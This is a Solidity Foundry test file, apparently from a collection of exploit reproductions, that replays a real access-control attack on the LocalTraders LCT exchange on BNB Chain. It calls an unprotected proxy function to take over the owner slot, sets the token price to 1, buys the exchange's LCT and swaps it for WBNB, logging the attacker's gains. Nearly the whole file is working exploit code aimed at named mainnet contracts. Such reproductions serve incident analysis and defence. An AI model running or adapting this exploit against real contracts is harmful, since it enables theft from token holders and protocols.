// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @TX's:
// 1. https://bscscan.com/tx/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba
// 2. https://bscscan.com/tx/0xbea605b238c85aabe5edc636219155d8c4879d6b05c48091cf1f7286bd4702ba
// 3. https://bscscan.com/tx/0x49a3038622bf6dc3672b1b7366382a2c513d713e06cb7c91ebb8e256ee300dfb
// 4. https://bscscan.com/tx/0x042b8dc879fa193acc79f55a02c08f276eaf1c4f7c66a33811fce2a4507cea63

// @Summary: Inproper access controll
// @Analysis: https://twitter.com/numencyber/status/1661213691893944320

interface ILCTExchange {
    function buyTokens() external payable;
}

contract LocalTraders is Test {
    ILCTExchange LCTExchange = ILCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address public upgradeableProxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_460_897);
        cheats.label(address(LCTExchange), "LCTExchange");
        cheats.label(address(Router), "Router");
        cheats.label(address(LCT), "LCT");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(upgradeableProxy, "Proxy");
    }

    function testAccess() public {
        // 1.Changing owner address in vulnerable contract

        emit log_named_decimal_uint(
            "[1] Attacker amount of WBNB before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
        address addrInSlot0Before = getValFromSlot0();
        emit log_named_address("[1] Address value in slot 0 before first call", addrInSlot0Before);

        // Changing address value in slot 0 (changing owner)
        address paramForCall1 = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;
        upgradeableProxy.call(abi.encodeWithSelector(0xb5863c10, paramForCall1));

        address addrInSlot0After = getValFromSlot0();
        // Confirm address change in slot 0
        assertEq(addrInSlot0After, paramForCall1);
        emit log_named_address("[1] Address value in slot 0 after first call", addrInSlot0After);

        // 2.Changing token price in vulnerable contract

        cheats.roll(28_460_898);
        uint256 uintInSlot3Before = getValFromSlot3();
        emit log_named_uint("[2] Uint value (token price) in slot 3 before second call", uintInSlot3Before);

        // Changing uint value in slot 3 (token price)
        uint256 paramForCall2 = 1;
        upgradeableProxy.call(abi.encodeWithSelector(0x925d400c, paramForCall2));

        uint256 uintInSlot3After = getValFromSlot3();
        // Confirm price change in slot 3
        assertEq(uintInSlot3After, paramForCall2);
        emit log_named_uint("[2] Uint value (token price) in slot 3 after second call", uintInSlot3After);

        // 3.Buying LCT

        cheats.roll(28_460_899);
        uint256 payableAmount = (LCT.balanceOf(address(LCTExchange)) / 1 ether) - 1;

        LCTExchange.buyTokens{value: payableAmount}();

        emit log_named_decimal_uint("[3] Bought LCT tokens", LCT.balanceOf(address(this)), LCT.decimals());

        // 4.Swap to WBNB

        cheats.roll(28_461_207);
        LCT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(LCT);
        path[1] = address(WBNB);
        // Func swapExactTokensForETHSupportingFeeOnTransferTokens() can be used for directly swap to BNB (instead of below function)
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            LCT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint(
            "[4] Attacker amount of WBNB after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function getValFromSlot0() internal returns (address) {
        bytes32 valInslot0 = cheats.load(upgradeableProxy, bytes32(uint256(0)));
        return address(uint160(uint256(valInslot0)));
    }

    function getValFromSlot3() internal returns (uint256) {
        bytes32 valInslot3 = cheats.load(upgradeableProxy, bytes32(uint256(3)));
        return uint256(valInslot3);
    }
}
